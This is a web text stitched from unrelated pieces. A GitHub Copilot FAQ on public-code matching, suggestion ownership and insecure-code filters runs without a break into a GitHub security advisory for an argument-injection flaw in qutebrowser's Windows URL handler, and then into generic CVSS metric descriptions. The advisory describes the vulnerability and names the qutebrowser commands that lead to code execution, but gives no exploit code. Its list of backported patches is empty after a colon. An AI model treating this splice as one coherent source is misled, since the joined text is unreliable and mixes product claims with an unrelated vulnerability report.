In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.

# Arbitrary command execution in qutebrowser on Windows via URL handler

High

[The-Compiler](/The-Compiler)
published
GHSA-vw27-fwjf-5qxm
Oct 21, 2021

## Package

pip

qutebrowser
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

>= 1.7.0

## Patched versions

2.4.0

## Description

### Impact

Starting with qutebrowser v1.7.0, the Windows installer for qutebrowser registers it as a handler for certain URL schemes. With some applications such as Outlook Desktop, opening a specially crafted URL can lead to argument injection, allowing execution of qutebrowser commands, which in turn allows arbitrary code execution via commands such as `:spawn` or `:debug-pyeval`.

Only Windows installs where qutebrowser is registered as URL handler are affected. It does *not* have to be set as default browser for the exploit to work.

### Patches

The issue has been fixed in [qutebrowser v2.4.0](https://github.com/qutebrowser/qutebrowser/releases/tag/v2.4.0) in commit [8f46ba3](https://github.com/qutebrowser/qutebrowser/commit/8f46ba3f6dc7b18375f7aa63c48a1fe461190430).

The fix also adds additional hardening for potential similar issues on Linux (by adding the new `--untrusted-args` flag to the `.desktop` file), though no such vulnerabilities are known.

Backported patches for older versions are available, but no further releases are planned:

### Workarounds

Remove qutebrowser from the default browser settings entirely, so that it does not handle any kind of URLs. Make sure to remove *all* handlers, including an (accidental) `qutebrowserURL` handler, e.g. using [NirSoft URLProtocolView](https://www.nirsoft.net/utils/url_protocol_view.html).

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
